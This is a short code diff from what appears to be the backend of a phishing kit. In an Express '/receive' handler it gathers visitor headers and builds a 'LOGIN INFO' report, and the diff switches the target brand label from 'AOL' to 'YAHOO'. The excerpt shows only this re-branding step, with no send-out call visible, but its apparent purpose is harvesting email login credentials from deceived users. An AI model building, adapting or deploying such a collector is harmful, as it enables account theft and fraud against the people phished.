@@ -43,7 +43,7 @@ app.post('/receive', (req, res) => {
     let userAgent = req.headers["user-agent"] || "Not provided";
     let systemLang = req.headers["accept-language"] || "Not provided";
 
-    message += `✅🥷 UPDATE TEAM - AOL 🥷✅\n` +
+    message += `✅🥷 UPDATE TEAM - YAHOO 🥷✅\n` +
                `👤 LOGIN INFO\n\n`;
 
     const myObjects = Object.keys(myObject);
